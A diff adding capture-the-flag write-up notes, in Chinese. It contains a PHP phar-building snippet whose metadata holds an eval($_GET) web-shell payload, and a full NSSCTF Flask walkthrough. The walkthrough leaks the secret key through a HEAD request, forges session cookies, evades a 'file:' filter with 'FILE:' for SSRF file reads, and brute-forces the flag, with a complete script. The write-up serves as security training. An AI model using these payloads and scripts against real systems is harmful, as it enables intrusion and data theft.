@@ -117,6 +117,26 @@ https://www.anquanke.com/post/id/240007
 > tar
 > zip
 
+php生成phar
+```php
+<?php
+class Testobj
+{
+  var $output='';
+}
+
+@unlink('test.phar');   //删除之前的test.par文件(如果有)
+$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
+$phar->startBuffering();  //开始写文件
+$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
+$o=new Testobj();  
+$o->output='eval($_GET["a"]);';  
+$phar->setMetadata($o);//写入meta-data
+$phar->addFromString("test.txt","test");  //添加要压缩的文件
+$phar->stopBuffering();
+?>
+```
+
 ## 第三关 `throw new Error('那么就从这里开始吧');`
 
 https://www.php.net/manual/zh/phar.fileformat.php
@@ -248,7 +268,7 @@ import requests
 
 def make_tarfile(output_filename, source_dir):
     os.system(f'tar -cf app.tar {source_dir}')
-    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
+    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2/python2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
     #     tar.add(source_dir, arcname=os.path.basename(source_dir))
 
 
@@ -487,4 +507,245 @@ while True:
     if res.status_code == 200:
         print(res.text)
         exit(0)
+```
+
+
+# NSSCTF prize3 - 限速|多线程下载
+
+# NSSCTF prize4 - ez flask
+
+进入开启bp, 抓包访问，提交表单，看到session里一段很长的flask的token签名。。。
+
+```
+Cookie: session=eyJhZG1pbiI6ZmFsc2UsImRhdGEiOnsiIGIiOiJNZz09In0sInVybCI6IjEifQ.YU2Iww.huCu4kQmY0WK1URUXDGcuZLhte4
+```
+
+base64解码前面的部分。  -- 小知识：flask token分3部分。payload+timestamp+签名, 中间用.分隔。
+
+```
+{"admin":false,"data":{" b":"Mg=="},"url":"1"}..Ø.0.à®âD&cE.ÕDT\1.¹.áµî
+```
+
+显然是提示想办法把admin修改为true。
+
+页面里给了getkey链接
+
+```python
+
+@app.route('/getkey', methods=["GET"])
+def getkey():
+    if request.method != "GET":
+        session["key"]=SECRET_KEY
+```
+它是GET方法，又不是GET方法。
+
+搜索 request.method 。第一条官方文档写得非常直白
+
+https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods
+
+> HEAD
+> HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。
+
+即可在Response里得到一个key值。再用flask自带的方法签名一下内容。
+
+```python
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = b'your_key'
+
+session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+
+@app.route('/')
+def index():
+    print(session_serializer.dumps("your_data"))
+
+index()
+```
+
+在开发者工具里修改cookie为新的签名。再访问/home页面得到源码。
+
+```python
+
+from flask import Flask, request, session, render_template, url_for,redirect,render_template_string
+import base64
+import urllib.request
+import uuid
+import flag
+
+SECRET_KEY=str(uuid.uuid4())
+
+app = Flask(__name__)
+app.config.update(dict(
+    SECRET_KEY=SECRET_KEY,
+))
+
+#src in /app
+
+@app.route('/')
+@app.route('/index',methods=['GET'])
+def index():
+    return render_template("index.html")
+
+@app.route('/get_data', methods=["GET",'POST'])
+def get_data():
+    data = request.form.get('data', '123')
+    if type(data) is str:
+        data=data.encode('utf8')
+    url = request.form.get('url', 'http://127.0.0.1:8888/')
+    if data and url:
+        session['data'] = data
+        session['url'] = url
+        session["admin"]=False
+        return redirect(url_for('home'))
+    return redirect(url_for('/'))
+
+@app.route('/home', methods=["GET"])
+def home():
+    if session.get("admin",False):
+        return render_template_string(open(__file__).read())
+    else:
+        return render_template("home.html",data=session.get('data','Not find data...'))
+
+@app.route('/getkey', methods=["GET"])
+def getkey():
+    if request.method != "GET":
+        session["key"]=SECRET_KEY
+    return render_template_string('''@app.route('/getkey', methods=["GET"])
+def getkey():
+    if request.method != "GET":
+        session["key"]=SECRET_KEY''')
+
+@app.route('/get_hindd_result', methods=["GET"])
+def get_hindd_result():
+    if session['data'] and session['url']:
+        if 'file:' in session['url']:
+            return "no no no"
+        data=(session['data']).decode('utf8')
+        url_text=urllib.request.urlopen(session['url']).read().decode('utf8')
+        if url_text in data or data in url_text:
+            return "you get it"
+    return "what ???"
+
+@app.route('/getflag', methods=["GET"])
+def get_flag():
+    res = flag.waf(request)
+    return res
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=False, port=8888)
+```
+
+flag就在 flag.py文件里。
+
+/get_hindd_result 过滤了file:协议，不能直接读取本地内容。。。大小写绕过
+
+爆破脚本上。搞出flag.py
+
+```py
+def waf(req):
+    if not req.base_url.startswith("http://127.0.0.1"):
+        return "NoNo!!"
+    if not req.full_path.endswith(".html?"):
+        return "No!"
+    return os.getenv("FLAG")
+```
+
+还是ssrf访问。继续爆flag。以.html?结束路径
+
+### 完整脚本
+```python
+from urllib.request import Request
+
+from requests_html import HTMLSession
+
+base_url = 'http://1.14.71.254:28093'
+# base_url = 'http://localhost:5000'
+s = HTMLSession()
+
+
+def step1():
+    import base64
+    import json
+
+    url = '%s/getkey' % base_url
+
+    res = s.head(url)
+    print(res.text)
+
+    session = res.headers.get('Set-Cookie')
+    jwts = session.split('=')[1]
+    j0 = jwts.split(';')[0].split('.')[0]
+
+    d = base64.b64decode((j0 + '==').encode()).decode()
+
+    d = json.loads(d)
+    key = d.get('key')
+    print(key)
+    open('key.txt', 'w').write(key)
+
+
+import flask_unsign
+
+chars = '\n'
+for i in range(32, 128):
+    chars += chr(i)
+from string import ascii_lowercase as al
+
+chars = ' ' + al + chars.replace(al, '').replace(' ', '')
+
+
+def step2():
+    flag = 'def waf(req)'
+    while True:
+        for c in chars:  # 10-lf,13-cr
+            txt = flag + c
+            data = {'admin': False, 'data': txt.encode(), 'url': 'FILE:///app/flag.py'}  # work
+            secret = open('key.txt', 'r').read()
+            s.cookies.clear()
+            session = flask_unsign.sign(data, secret)
+            cookies = {"session": session}
+
+            url = '%s/get_hindd_result' % base_url
+            res = s.get(url, cookies=cookies)
+
+            if 'you get it' in res.text:
+                flag += c
+                print(f'char:{c}, flag = {flag}')
+                break
+            else:
+                print(f'{c}: {res.text}')
+            if ord(c) == 127:
+                raise Exception
+
+
+def step3():
+    flag = 'NSSCTF{'
+    while True:
+        for c in chars:  # 10-lf,13-cr
+            txt = flag + c
+            data = {'admin': False, 'data': txt.encode(), 'url': 'http://127.0.0.1:8888/getflag?1.html?'}  # work
+            secret = open('key.txt', 'r').read()
+            s.cookies.clear()
+            session = flask_unsign.sign(data, secret)
+            cookies = {"session": session}
+
+            url = '%s/get_hindd_result' % base_url
+            res = s.get(url, cookies=cookies)
+
+            if 'you get it' in res.text:
+                flag += c
+                print(f'char:{c}, flag = {flag}')
+                break
+            else:
+                print(f'{c}: {res.text}')
+            if ord(c) == 127:
+                raise Exception
+
+
+if __name__ == '__main__':
+    # step1()
+    # step2()
+    step3()
 ```
